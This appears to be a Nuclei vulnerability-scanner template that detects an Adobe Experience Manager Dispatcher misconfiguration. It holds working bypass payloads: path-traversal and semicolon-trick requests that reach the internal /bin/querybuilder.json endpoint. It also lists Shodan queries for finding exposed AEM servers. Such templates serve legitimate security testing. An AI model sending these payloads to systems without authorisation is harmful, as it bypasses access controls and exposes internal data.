http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"success":true'
    - '"results":'
    - '"hits":'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    paths:
    - /graphql/execute.json/..%2f../bin/querybuilder.json
    - /bin/querybuilder.json;x='x/.ico/y'
    - /bin/querybuilder.json;x='x/graphql/execute/json/y'
  raw:
  - 'GET {{paths}} HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: aem-dispatcher-bypass
info:
  author: DhiyaneshDK,assetnote
  description: 'Detected potential Adobe Experience Manager (AEM) Dispatcher misconfigurations
    that could have allowed bypassing request filtering, exposing internal endpoints,
    or permitting unauthorised access to restricted resources.

    '
  metadata:
    max-request: 1
    product: experience_manager
    shodan-query:
    - http.title:"aem sign in"
    - http.component:"adobe experience manager"
    - cpe:"cpe:2.3:a:adobe:experience_manager"
    vendor: adobe
    verified: true
  name: Adobe Experience Manager - Dispatcher Bypass
  reference:
  - https://docs.google.com/presentation/d/1PypHgd0r3ZVII7e5fLX5JjZIJQfAsMEydLnug0yFb9k/edit?usp=sharing
    (Slide 18,22,24)
  severity: medium
  tags: adobe,aem,dispatcher
